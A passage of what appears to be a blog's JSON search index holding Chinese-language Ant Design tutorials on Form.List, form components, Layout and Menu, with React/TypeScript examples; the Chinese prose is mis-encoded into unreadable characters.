0 éå¢çš„æ•¸å­—ä¾†ç•¶ä½œæ¬„ä½åç¨±ã€‚ è‡³æ–¼ key é›–ç„¶çœ‹èµ·ä¾†ä¹Ÿæ˜¯å¾ 0 é–‹å§‹éå¢çš„æ•¸å­—ï¼Œå¯æ˜¯æœ‰ä¸€å€‹å¾ˆé‡è¦çš„å·®åˆ¥æ˜¯æœƒä¸åœã€Œéå¢ä¸Šå»ã€ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘åŸæœ¬æœ‰ 3 å€‹æ¬„ä½ï¼Œç¾åœ¨å‹•æ…‹åˆªé™¤äº† 1 å€‹æ¬„ä½ï¼Œæ¥è‘—å†æ–°å¢ 1 å€‹æ¬„ä½ï¼Œfields çš„å…§å®¹æœƒè®Šé€™æ¨£ï¼š ä»–ä¸åƒ name ä¸€æ¨£æœƒè‡ªå‹•ã€Œå€’é€€å›å»ã€ï¼Œè€Œæ˜¯ä¸åœçš„éå¢ä¸Šå»ä¾†ç¢ºä¿ã€Œå”¯ä¸€æ€§ã€ã€‚ä»”ç´°æƒ³æƒ³å°±æœƒè¦ºå¾—é€™ä¹ŸæŒºåˆç†çš„ï¼Œç•¢ç«Ÿæ˜¯ key å˜›ï¼Ÿ é€™é‚Šä¹Ÿç¨å¾®è¤‡é›œä¸€é»ï¼Œä¸æ‡‚çš„è©±åˆ° é€™é‚Š è‡ªå·±ç©ç©çœ‹ã€‚ operationé€™å€‹å°±æ¯”è¼ƒå¥½ç†è§£ä¸€äº›äº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç‰©ä»¶ä¸­æœ‰ä¸‰å€‹ functionï¼š add(defaultValue?: any, insertIndex?: number) æ–°å¢ä¸€ç­†æ¬„ä½ï¼ˆåˆå§‹å€¼ &amp; æ’å…¥ä½ç½®ï¼‰ remove(index: number | number[]) å‚³å…¥æŒ‡å®šçš„å€¼ä¾†æŠŠæ¬„ä½åˆªé™¤ï¼ˆé€šå¸¸æœƒå‚³ field.nameï¼‰ move: (from: number, to: number) ç§»å‹•æ¬„ä½çš„ä½ç½® metaé€™å€‹æ˜¯æ­é… Form.ErrorList ä½¿ç”¨çš„æ±è¥¿ï¼Œä½†æˆ‘çœ‹ä¸å¤ªæ‡‚å®˜æ–¹çš„ ç¯„ä¾‹ æ˜¯ä»€éº¼æ„æ€ã€‚ç¸½ä¹‹é€™å€‹æ‡‰è©²ä¸å¤ªå¸¸æœƒç”¨åˆ°ï¼Œåªè¦çŸ¥é“ä¸€ä¸‹æ˜¯è·ŸéŒ¯èª¤æœ‰é—œçš„æ±è¥¿å°±è¡Œäº†ã€‚ ç¸½ä¹‹ä»¥ä¸Šçœ‹å®Œå¾Œä½ æ‡‰è©²å°±å° Form.List æœ‰ä¸€å®šçš„ç†è§£äº†ï¼Œå‰©ä¸‹çš„å°±å¤šç·´ç¿’å§ã€‚ å¦å¤–å¦‚æœä½ æƒ³è¦çš„æ˜¯æ¯”è¼ƒå–®ç´”çš„è³‡æ–™ï¼Œåƒé€™æ¨£ï¼š 123{ name: ['name1', 'name2', 'name3']} å¯ä»¥åƒè€ƒæˆ‘å¯«çš„ç°¡åŒ–ç‰ˆç¯„ä¾‹","link":"/2022/07/26/antd-form-list/"},{"title":"Ant Designï¼è¡¨å–®ç›¸é—œå…ƒä»¶","text":"è¡¨å–®çœ‹ä¼¼ç°¡å–®ï¼Œå»å……æ»¿å„ç¨®ç´°ç¯€ã€‚ åŸºæœ¬çµæ§‹åŸºæœ¬çµæ§‹æœƒç”± Formã€Form.item å’Œ Inputï¼ˆè¡¨å–®ç›¸é—œå…ƒä»¶ï¼‰ ä¾†çµ„æˆã€‚ é€™é‚Šæœƒç”¨ä¸€å€‹ç™»å…¥è¡¨å–®ä¾†åšè¬›è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import React from 'react';import { Row, Col, Form, Input ,Button, Checkbox, Space, notification} from \"antd\";import { UserOutlined } from \"@ant-design/icons\";function Main() { // é€šéé©—è­‰æ‰æœƒ trigger const onFinish = (values: any) =&gt; { notification.success({ message: 'Success!', description: ` username: ${values.username}, password: ${values.passowrd}, remember: ${values.remember} ` }) } // æ²’é€šéé©—è­‰æ™‚ trigger const onFinishFailed = (errorInfo: any) =&gt; { notification.error({ message: 'Failed', description: ` Please cofirm your content are vaild. ` }) } return ( &lt;&gt; &lt;Row&gt; &lt;Col offset={6} span={12}&gt; &lt;h2&gt;&lt;Space&gt;&lt;UserOutlined /&gt;Log in&lt;/Space&gt;&lt;/h2&gt; &lt;Form name=\"basic\" {/* input çš„æ ¼ç·š */} wrapperCol={{span: 24}} {/* label æ–‡å­—çš„æ ¼ç·š */} labelCol={{span: 24}} {/* åˆå§‹å€¼ */} initialValues={{ remember: true }} onFinish={onFinish} onFinishFailed={onFinishFailed} autoComplete=\"off\" &gt; &lt;Form.Item {/* è¦é¡¯ç¤ºçš„æ–‡å­— */} label=\"Username\" // data çš„ key name=\"username\" rules={[ { {/* æ˜¯å¦å¿…å¡« */} required: true, {/* éŒ¯èª¤è¨Šæ¯æ–‡å­— */} message: 'Please input your username' } ]} &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item {/* è¦é¡¯ç¤ºçš„æ–‡å­— */} label=\"Password\" {/* data çš„ key */} name=\"passowrd\" rules={[ { {/* æ˜¯å¦å¿…å¡« */} required: true, {/* éŒ¯èª¤è¨Šæ¯æ–‡å­— */} message: 'Please input your password' } ]} &gt; {/* æé†’ä¸€ä¸‹ï¼Œå¯†ç¢¼è¦å¯«æˆé€™æ¨£ */} &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name=\"remember\" {/* ä¸å¤ªæ‡‚æ–‡ä»¶æ„æ€ï¼Œç¸½ä¹‹åŠ ä¸Šå»å¾Œè³‡æ–™è·Ÿç•«é¢æ‰æœƒæ˜¯åŒæ­¥çš„ */} valuePropName='checked' &gt; &lt;Checkbox&gt;Remember me&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Form.Item&gt; &lt;Row justify='end'&gt; &lt;Col&gt;&lt;Button type='primary' htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Col&gt; &lt;/Row&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/Col&gt; &lt;/Row&gt; &lt;/&gt; );}export default Main; é€™å€‹ç¯„ä¾‹æœ‰ç”¨åˆ°çš„æ±è¥¿ï¼š onFinish é€šéé©—è­‰çš„ handler onFinishFailed æ²’é€šéé©—è­‰çš„ handler &lt;Form wrapperCol /&gt; å°åº•ä¸‹çš„æ‰€æœ‰ &lt;input /&gt; åšä½ˆå±€è¨­å®š &lt;Form labelCol /&gt; å°åº•ä¸‹çš„æ‰€æœ‰ label æ–‡å­—åšä½ˆå±€è¨­å®š &lt;Form initialValues /&gt; æ¬„ä½çš„åˆå§‹å€¼ &lt;Form.Item label /&gt; label æ–‡å­— &lt;Form.Item name /&gt; è³‡æ–™çš„ key å€¼ &lt;Form.Item rules /&gt; è·Ÿé©—è­‰ç›¸é—œçš„æ±è¥¿ &amp; æç¤ºè¨Šæ¯ &lt;Form.Item valuePropName /&gt; æœƒç”¨åˆ° check çš„è©±è¦è¨˜å¾—è¨­å®šé€™å€‹ Radioæœƒç”± Radio.Group å’Œ Group ä¾†çµ„æˆã€‚ 123456789101112131415161718192021import React, { useState } from 'react'import { Form, Input, Button, Radio } from 'antd'import { UserOutlined } from '@ant-design/icons'function Main() { const [value, setValue] = useState(1) const onChange = (e: any) =&gt; setValue(e.target.value) return ( &lt;&gt; &lt;Radio.Group name='type' onChange={onChange} value={value}&gt; &lt;Radio value={1}&gt;A&lt;/Radio&gt; &lt;Radio value={2}&gt;B&lt;/Radio&gt; &lt;Radio value={3}&gt;C&lt;/Radio&gt; &lt;Radio value={4}&gt;D&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/&gt; )}export default Main ä¹Ÿå¯ä»¥æ”¹ç”¨ options çš„æ–¹å¼ä¾†è¨­å®šï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import React, { useState } from 'react';import { Form, Input ,Button, Radio } from \"antd\";import { UserOutlined } from \"@ant-design/icons\";function Main() { const options = [ { label: 'A', value: 1, disabled: false }, { label: 'B', value: 2, disabled: false }, { label: 'C', value: 3, disabled: false }, { label: 'D', value: 4, disabled: false }, { label: 'E', value: 5, disabled: true } ] const [value, setValue] = useState(1); const onChange = (e: any) =&gt; setValue(e.target.value); return &lt;Radio.Group name=\"type\" onChange={onChange} value={value} options={options} /&gt; );}export default Main; CheckboxåŸºæœ¬ç”¨æ³•ï¼Œè·Ÿ Radio å·®ä¸å¤šã€‚ 123456789101112131415161718import React, { useState } from 'react'import { Form, Input, Button, Checkbox } from 'antd'import { UserOutlined } from '@ant-design/icons'function Main() { const [value, setValue] = useState(1) const onChange = (e: any) =&gt; setValue(e.target.value) return ( &lt;Checkbox.Group name='options'&gt; &lt;Checkbox value={1}&gt;Option1&lt;/Checkbox&gt; &lt;Checkbox value={2}&gt;Option2&lt;/Checkbox&gt; &lt;Checkbox value={3}&gt;Option3&lt;/Checkbox&gt; &lt;/Checkbox.Group&gt; )}export default Main ä¸€æ¬¡å…¨é¸ç›´æ¥çœ‹ codeï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142import React, { useState } from 'react'import { Checkbox } from 'antd'const plainOptions = ['Apple', 'Orange', 'Pear']const defaultCheckList = ['Apple', 'Orange']function Main() { // æ˜¯å¦æœ‰é¸æ“‡ä¸€å€‹ä»¥ä¸Š const [indeterminate, setIndeterminate] = useState(true) // æ˜¯å¦å…¨é¸ const [checkAll, setCheckAll] = useState(false) // é è¨­é¸é … const [checkList, setCheckList] = useState(defaultCheckList) const onCheckAllChange = (e: any) =&gt; { setCheckList(e.target.checked ? plainOptions : []) setIndeterminate(false) setCheckAll(e.target.checked) } const onChnage = (list: any) =&gt; { setCheckList(list) // !! çš„ç”¨é€”æ˜¯åªè¦æ˜¯ falsy å°±å›å‚³ false // é€™é‚Šæ˜¯è¦ç¢ºèªç›®å‰é•·åº¦ &lt; æ‰€æœ‰é¸é …é•·åº¦ // åªæ˜¯åˆ©ç”¨çŸ­è·¯é‹ç®—å…ˆåˆ¤æ–· list.length æ˜¯å¦ç‚º 0ï¼Œè—‰æ­¤çœæ‰å¾Œé¢çš„æ¯”å°ã€‚ setIndeterminate(!!list.length &amp;&amp; list.length &lt; plainOptions.length) // ç”¨é•·åº¦ä¾†åˆ¤æ–·å…¨é¸ setCheckAll(list.length === plainOptions.length) } return ( &lt;&gt; &lt;Checkbox indeterminate={indeterminate} onChange={onCheckAllChange} checked={checkAll}&gt; Check All &lt;/Checkbox&gt; {/* æ”¹ç”¨ options æ¸²æŸ“ */} &lt;Checkbox.Group name='options' options={plainOptions} value={checkList} onChange={onChnage} /&gt; &lt;/&gt; )}export default Main ä¸‹æ‹‰é¸å–®æœƒç”± Select å’Œ Optnio ä¾†çµ„æˆï¼š 12345678910111213141516171819import React, { useState } from 'react'import { Select } from 'antd'const { Option } = Selectfunction Main() { const handleChange = (value: string) =&gt; console.log(value) return ( &lt;Select defaultValue='peanu' onChange={handleChange}&gt; &lt;Option value='peanu'&gt;PeaNU&lt;/Option&gt; &lt;Option value='ppb'&gt;PPB&lt;/Option&gt; &lt;Option value='et'&gt;ET&lt;/Option&gt; &lt;Option value='garry'&gt;Garry&lt;/Option&gt; &lt;/Select&gt; )}export default Main æ”¹ç”¨ optnios å±¬æ€§ä¾†æ¸²æŸ“ï¼ˆæ“šèªªæ•ˆèƒ½æ¯”è¼ƒå¥½ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233import React, { useState } from 'react'import { Select } from 'antd'const options = [ { label: 'PeaNu', value: 'peanu' }, { label: 'PPB', value: 'ppb' }, { label: 'ET', value: 'et' }, { label: 'Garry', value: 'garry' }]function Main() { const handleChange = (value: string) =&gt; console.log(value) return ( &lt;&gt; &lt;Select options={options} defaultValue='peanu' onChange={handleChange} /&gt; &lt;/&gt; )}export default Main ä»‹ç´¹å¹¾å€‹ Input çš„ props123456&lt;Input readOnly={true} /&gt; // çœ‹èµ·ä¾†å¯ä»¥è¼¸å…¥ï¼Œä½†ä¸è¡Œ&lt;Input disabled={true} /&gt; // ç¦ç”¨&lt;Input maxLength={20} /&gt; // æœ€å¤§é•·åº¦&lt;Input showCount={true} /&gt; // é¡¯ç¤ºé•·åº¦&lt;Input prefix={&lt;UserOutlined /&gt;} /&gt; // åœ¨å‰é¢æ’å…¥ icon&lt;Input suffix={&lt;UserOutlined /&gt;}/&gt; // åœ¨å¾Œé¢æ’å…¥ icon æ”¹è®Š password çš„ iconï¼š1234567891011121314151617import React, { useState } from 'react'import { Input } from 'antd'import { EyeFilled, EyeInvisibleFilled } from '@ant-design/icons'function Main() { return ( &lt;&gt; &lt;Input.Password iconRender={(visible: boolean) =&gt; { return visible ? &lt;EyeFilled /&gt; : &lt;EyeInvisibleFilled /&gt; }} /&gt; &lt;/&gt; )}export default Main å’Œ Form ç›¸é—œçš„å±¬æ€§initialValues è¨­å®šæ¬„ä½çš„åˆå§‹å€¼é™„è¨»ï¼šæé†’ä¸€ä¸‹ï¼Œkey æœƒå°æ‡‰åˆ° Form.Item çš„ name å±¬æ€§ 1234567891011121314151617181920212223242526272829303132import React, { useState } from 'react'import { Input, Form, Radio } from 'antd'import { EyeFilled, EyeInvisibleFilled } from '@ant-design/icons'const initialValues = { username: 'PeaNu', password: '123456789', gender: 'man'}function Main() { return ( &lt;&gt; &lt;Form autoComplete='off' initialValues={initialValues}&gt; &lt;Form.Item label='Username' name='username'&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Passowrd' name='password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='gender'&gt; &lt;Radio.Group&gt; &lt;Radio value='man'&gt;Man&lt;/Radio&gt; &lt;Radio value='female'&gt;Female&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main validateTriggerå¦‚åï¼Œè¨­å®šä»€éº¼æ™‚å€™è§¸ç™¼é©—è­‰çš„ handlerï¼Œé è¨­æ˜¯ onChangeã€‚ å¦‚æœæˆ‘æƒ³è®“ onBlur æ™‚ä¹Ÿè§¸ç™¼ï¼Œå¯ä»¥é€™æ¨£åšï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344import React from 'react'import { Input, Form, Radio } from 'antd'function Main() { return ( &lt;&gt; {/* åŠ ä¸Š validateTrigger */} &lt;Form autoComplete='off' validateTrigger={['onBlur', 'onChnage']}&gt; &lt;Form.Item label='Username' name='username' rules={[ { required: true, message: 'Please input the username' } ]} &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Passowrd' name='password' rules={[ { required: true, message: 'Please input the password' } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='gender'&gt; &lt;Radio.Group&gt; &lt;Radio value='man'&gt;Man&lt;/Radio&gt; &lt;Radio value='female'&gt;Female&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main formé€™å€‹è¦æ­é… useForm() ä¾†ä½¿ç”¨ï¼Œå®ƒæœƒå›å‚³ä¸€å€‹ instanceï¼Œå¯ä»¥æ‹¿é€™å€‹ instance åšä¸€äº›äº‹æƒ…ã€‚ä¾‹å¦‚ï¼šç•¶ä½ æƒ³ä¸€æ¬¡è¨­å®šå¾ˆå¤šå€‹æ¬„ä½çš„é è¨­å€¼ 1234567891011121314151617181920212223242526272829303132import React from 'react'import { Form, Input, Button } from 'antd'function Main() { // get instance const [form] = Form.useForm() // è¨­å®šé è¨­å€¼ form.setFieldsValue({ username: 'PeaNu', password: '123456789' }) return ( &lt;&gt; {/* è¨˜å¾—è¦æ”¾åˆ° form å±¬æ€§è£¡ */} &lt;Form form={form} autoComplete='off'&gt; &lt;Form.Item label='Username' name='username'&gt; &lt;Input /&gt; &lt;Input.Search /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Password' name='password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; {/* é»æ“Šæ™‚é¡¯ç¤ºæ‰€æœ‰æ¬„ä½çš„è³‡æ–™ */} &lt;Button onClick={() =&gt; console.log(form.getFieldsValue())}&gt;Check data&lt;/Button&gt; &lt;/&gt; )}export default Main å› ç‚ºå¯ä»¥ç”¨çš„æ±è¥¿å¾ˆå¤šå°±ä¸ä¸€ä¸€åˆ—å‡ºï¼Œæœ‰éœ€è¦çš„è©±åƒè€ƒé€™è£¡ã€‚","link":"/2022/05/17/antd-form/"},{"title":"Ant Designï¼Layout","text":"ç†Ÿäº†ä»¥å¾Œå°±èƒ½å¿«é€Ÿåˆ»å‡º Layoutã€‚ åŸºæœ¬çµæ§‹1234567891011121314import { Layout } from 'antd'function App() { return ( &lt;Layout&gt;This is header&lt;/Layout.Header&gt; &lt;Layout&gt; &lt;Layout.Sider&gt;This is side bar&lt;/Layout.Sider&gt; &lt;Layout.Content&gt;This is content&lt;/Layout.Content&gt; &lt;/Layout&gt; &lt;Layout.Footer&gt;This is Footer&lt;/Layout.Footer&gt; &lt;/Layout&gt; )}export default App ä¸»è¦çš„åŠŸèƒ½æ˜¯å»ºç«‹çµæ§‹èˆ‡ HTML Semantic Tagï¼Œä¸éå› ç‚ºæœ‰é è¨­æ¨£å¼æ‰€ä»¥çœ‹èµ·ä¾†æœƒå¾ˆå¥‡è‘©ï¼š é€™æ™‚å€™ä½ å¯ä»¥ç›´æ¥ç”¨é è¨­çš„ className å»æ”¹ï¼Œäº¦æˆ–æ˜¯åŠ ä¸Šè‡ªå·±çš„ className ä¾†æ”¹ï¼Œé€™è£¡æˆ‘é¸æ“‡å¾Œè€…ï¼š 1234567891011121314151617181920function App() { return ( &lt;Layout className='demo-layout-wrapper'&gt; &lt;Layout.Header className='demo-layout-header'&gt; &lt;h2&gt;This is header&lt;/h2&gt; &lt;/Layout.Header&gt; &lt;Layout&gt; &lt;Layout.Sider className='demo-layout-sider'&gt; &lt;h2&gt;This is side bar&lt;/h2&gt; &lt;/Layout.Sider&gt; &lt;Layout.Content className='demo-layout-content'&gt; &lt;h2&gt;This is content&lt;/h2&gt; &lt;/Layout.Content&gt; &lt;/Layout&gt; &lt;Layout.Footer className='demo-layout-footer'&gt; &lt;h2&gt;This is Footer&lt;/h2&gt; &lt;/Layout.Footer&gt; &lt;/Layout&gt; )} 123456789101112131415161718192021222324252627282930313233343536h2 { color: white; text-align: center; margin-bottom: 0;}.demo-layout-wrapper { color: white; .demo-layout-header { color: white; background-color: #5dadfb; text-align: center; height: 70px; } .demo-layout-sider { background-color: #73b9fc; height: calc(100vh - 150px); .ant-layout-sider-children { display: flex; flex-direction: column; justify-content: center; } } .demo-layout-content { background-color: #419ffb; display: flex; flex-direction: column; justify-content: center; text-align: center; } .demo-layout-footer { background-color: #94c7f8; height: 80px; font-size: 0.8rem; }} ç¯„ä¾‹é‚Šçœ‹æ–‡ä»¶é‚Šç·´ç¿’å¾Œï¼Œå¤§æ¦‚å°±èƒ½åšå‡ºåŸºæœ¬çš„ç¶²ç«™æ¨£è²Œï¼š åŸå§‹ç¢¼ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import { Breadcrumb, Button, CheckboxOptionType, Col, Image, Layout, Menu, Radio, Rate, Row, Spin} from 'antd'import { ItemType } from 'antd/lib/menu/hooks/useItems'import { useEffect, useState } from 'react'function App() { const [loading, setLoading] = useState&lt;boolean&gt;(true) const menu: ItemType[] = Array(5) .fill(null) .map((_, index) =&gt; ({ key: index + 1, label: `Nav ${index + 1}` })) const options: CheckboxOptionType[] = [ { label: 'XXS', value: 'xxs' }, { label: 'XS', value: 'xs' }, { label: 'S', value: 's' }, { label: 'M', value: 'm' }, { label: 'L', value: 'l' }, { label: 'XL', value: 'xl' }, { label: 'XXL', value: 'xxl' } ] useEffect(() =&gt; { setTimeout(() =&gt; { setLoading(false) }, 1000) }, []) return ( &lt;Layout className='demo-layout-wrapper'&gt; &lt;Layout.Header className='demo-layout-header'&gt; &lt;div className='demo-layout-header-left'&gt; &lt;div className='demo-layout-header-logo'&gt;&lt;/div&gt; &lt;/div&gt; &lt;div className='demo-layout-header-right'&gt; &lt;Menu mode='horizontal' items={menu} /&gt; &lt;/div&gt; &lt;/Layout.Header&gt; &lt;Layout.Content className='demo-layout-content'&gt; &lt;Breadcrumb&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Product&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt;Product Detail&lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;div className='demo-layout-content-main'&gt; &lt;Spin size='large' spinning={loading}&gt; &lt;h2 className='demo-layout-content-main-title'&gt;Product Tiitle&lt;/h2&gt; &lt;div className='demo-layout-content-main-detail'&gt; &lt;Row gutter={[50, 50]}&gt; &lt;Col span={24} lg={8}&gt; &lt;Image width={'100%'} src='https://photo.queenshop.com.tw/01039398/01039398-h.jpg' /&gt; &lt;/Col&gt; &lt;Col span={24} lg={16}&gt; &lt;div className='demo-layout-content-main-detail-rate'&gt; &lt;Rate allowHalf disabled defaultValue={4} /&gt; &lt;/div&gt; &lt;p className='demo-layout-content-main-detail-description'&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Quia provident ullam obcaecati alias vel vitae excepturi similique dolorum itaque corrupti, deserunt eligendi temporibus voluptates commodi! Sed quam aliquam in accusantium? &lt;/p&gt; &lt;h3 className='demo-layout-content-main-detail-prize'&gt; Prize: &lt;span&gt;13.00$&lt;/span&gt; &lt;/h3&gt; &lt;Radio.Group options={options} /&gt; &lt;div className='demo-layout-content-main-detail-button'&gt; &lt;Button&gt;Buy it now&lt;/Button&gt; &lt;/div&gt; &lt;/Col&gt; &lt;/Row&gt; &lt;/div&gt; &lt;/Spin&gt; &lt;/div&gt; &lt;/Layout.Content&gt; &lt;Layout.Footer className='demo-layout-footer'&gt; &lt;p&gt;Copyright Â© 2022. Dont know what is&lt;/p&gt; &lt;/Layout.Footer&gt; &lt;/Layout&gt; )}export default App 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192@import '~antd/dist/antd.css';.demo-layout-wrapper { color: white; .demo-layout-header { display: flex; align-items: center; height: 70px; background-color: #002140; .demo-layout-header-left { margin-right: 40px; .demo-layout-header-logo { width: 100px; height: 40px; background: #f2f2f2; } } .demo-layout-header-right { width: 100%; .ant-menu { border: 0; background: inherit; color: white; .ant-menu-item { &amp;.ant-menu-item-selected { &amp;::after { display: none; } } &amp;.ant-menu-item-active { background: #419ffb; color: white; } } } } } .demo-layout-content { background-color: #f2f2f2; padding: 20px 50px; min-height: calc(100vh - 70px - 60px); .demo-layout-content-main { background-color: white; padding: 20px; margin-top: 20px; .demo-layout-content-main-title { font-size: 24px; color: #444; } .demo-layout-content-main-detail { .demo-layout-content-main-detail-rate { margin-bottom: 10px; } .demo-layout-content-main-detail-description { color: #444; } .demo-layout-content-main-detail-prize { margin-bottom: 15px; span { text-decoration: underline; } } .demo-layout-content-main-detail-button { margin-top: 25px; .ant-btn { background-color: #339cff; color: white; padding: 8px 16px; height: auto; border: none; box-shadow: none; &amp;:hover { opacity: 0.8; } } } } } } .demo-layout-footer { height: 60px; padding: 20px; text-align: center; color: white; background-color: #002140; font-size: 0.8rem; p { margin-bottom: 0; } }}","link":"/2022/09/22/antd-layout/"},{"title":"Ant Designï¼Menu","text":"ç¶²é ä¸­æœ€é‡è¦çš„ä¸€éƒ¨åˆ†ã€‚ åŸºæœ¬çµæ§‹é™„è¨»ï¼šå¦‚æœæ˜¯ &lt;= 4.20 çš„è©±å¾—ç”¨ JSX çš„å¯«æ³• æœƒç”± Menuã€Menu.Itemã€Menu.SubMenu å’Œ Menu.ItemGroup ä¾†çµ„æˆï¼š 1234567891011121314151617181920212223242526import React, { useState } from 'react'import { Menu } from 'antd'function Main() { return ( &lt;Menu mode='horizontal' defaultSelectedKeys={['home']}&gt; &lt;Menu.Item key='home'&gt;Home&lt;/Menu.Item&gt; &lt;Menu.Item key='about'&gt;About&lt;/Menu.Item&gt; &lt;Menu.SubMenu key='products' title='Products'&gt; &lt;Menu.ItemGroup title='Type A'&gt; &lt;Menu.Item key='a1'&gt;ProductA-1&lt;/Menu.Item&gt; &lt;Menu.Item key='a2'&gt;ProductA-2&lt;/Menu.Item&gt; &lt;Menu.Item key='a3'&gt;ProductA-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;Menu.ItemGroup title='Type B'&gt; &lt;Menu.Item key='b1'&gt;ProductB-1&lt;/Menu.Item&gt; &lt;Menu.Item key='b2'&gt;ProductB-2&lt;/Menu.Item&gt; &lt;Menu.Item key='b3'&gt;ProductB-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;/Menu.SubMenu&gt; &lt;Menu.Item key='contact'&gt;Contact&lt;/Menu.Item&gt; &lt;/Menu&gt; )}export default Main å‡ºä¾†çš„çµæœå¤§æ¦‚å°±åƒé€™æ¨£ å¦‚æœæ˜¯ &gt;= 4.20 çš„è©±ï¼Œå¯ä»¥æ”¹ç”¨ props çš„æ–¹å¼ä¾†å¯«ï¼ˆå®˜æ–¹ä¹Ÿæ¨è–¦é€™æ¨£ç”¨ï¼‰ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import { Menu } from 'antd'const items = [ { key: 'home', label: 'Home' }, { key: 'about', label: 'About' }, { key: 'producrs', label: 'Products', // submenu children: [ // group1 { type: 'group', label: 'Type A', children: [ { key: 'a1', label: 'ProductA-1' }, { key: 'a2', label: 'ProductA-2' }, { key: 'a3', label: 'ProductA-3' } ] }, // group2 { type: 'group', label: 'Type B', children: [ { key: 'b1', label: 'ProductB-1' }, { key: 'b2', label: 'ProductB-2' }, { key: 'b3', label: 'ProductB-3' } ] } ] }, { key: 'service', label: 'Service' }]export default function App() { return &lt;Menu items={items} mode='horizontal' defaultSelectedKeys={['home']} /&gt;} è‡³æ–¼ active çš„ç‹€æ…‹å®ƒæœƒè‡ªå·±å¹«ä½ è™•ç†ï¼Œæ‰€ä»¥ä¸ç”¨é¡å¤–è¨­å®šã€‚ è‡ªå·±è™•ç† active ç‹€æ…‹å¦‚æœä½ æƒ³è¦è‡ªå·±è¨­å®š active ç‹€æ…‹çš„è©±ï¼Œå¯ä»¥ç”¨ selectedKeys ä¾†è™•ç†ï¼š 1234567891011121314151617181920212223242526272829303132333435import React from 'react'import type { MenuProps } from 'antd'import { Menu } from 'antd'function Main() { const [current, setCurrent] = React.useState&lt;string[]&gt;(['home']) const handleClick: MenuProps['onClick'] = (e) =&gt; { // é¡¯ç¤ºé»æ“Šé …ç›®çš„ keyï¼ˆæˆ‘å€‘è¨­çš„é‚£å€‹ï¼‰ console.log('click', e.key) setCurrent([e.key]) } return ( &lt;Menu mode='horizontal' onClick={handleClick} selectedKeys={current}&gt; &lt;Menu.Item key='home'&gt;Home&lt;/Menu.Item&gt; &lt;Menu.Item key='about'&gt;About&lt;/Menu.Item&gt; &lt;Menu.SubMenu key='products' title='Products'&gt; &lt;Menu.ItemGroup title='Type A'&gt; &lt;Menu.Item key='a1'&gt;ProductA-1&lt;/Menu.Item&gt; &lt;Menu.Item key='a2'&gt;ProductA-2&lt;/Menu.Item&gt; &lt;Menu.Item key='a3'&gt;ProductA-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;Menu.ItemGroup title='Type B'&gt; &lt;Menu.Item key='b1'&gt;ProductB-1&lt;/Menu.Item&gt; &lt;Menu.Item key='b2'&gt;ProductB-2&lt;/Menu.Item&gt; &lt;Menu.Item key='b3'&gt;ProductB-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;/Menu.SubMenu&gt; &lt;Menu.Item key='contact'&gt;Contact&lt;/Menu.Item&gt; &lt;/Menu&gt; )}export default Main è·Ÿ React router çµåˆèµ·ä¾†å¦‚æœå¯ä»¥é€éä¸€ä»½è³‡æ–™ï¼Œå°±è‡ªå‹•ç”¢ç”Ÿ Menu è·Ÿ Router çš„è©±æ˜¯ä¸æ˜¯æŒºæ–¹ä¾¿çš„ï¼Ÿé€™å€‹å…¶å¯¦æ˜¯æœ‰è¾¦æ³•åšåˆ°çš„ï¼é€™é‚Šæœƒå…ˆä»‹ç´¹ &gt;= 4.20 çš„æ–¹æ³•ï¼Œæ¯”è¼ƒç°¡æ½”ä¸€é»ã€‚ å‡è¨­ Menu æœƒæœ‰å››å€‹é€£çµï¼š Home Products Service About é‚£å°è¦½åˆ—çš„éƒ¨åˆ†å°±æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617181920212223const menu = [ { key: 'home', label: 'Home' }, { key: 'products', label: 'Products' }, { key: 'service', label: 'Service' }, { key: 'about', label: 'About' }]fucntino Nav () { return &lt;Menu items={menu} /&gt;} è·¯ç”±çš„éƒ¨åˆ†å‰‡æœƒé€™æ¨£å¯«ï¼š 12345678910function Main() { return ( &lt;Routes&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='products' element={&lt;Products /&gt;} /&gt; &lt;Route path='service' element={&lt;Service /&gt;} /&gt; &lt;Route path='about' element={&lt;About 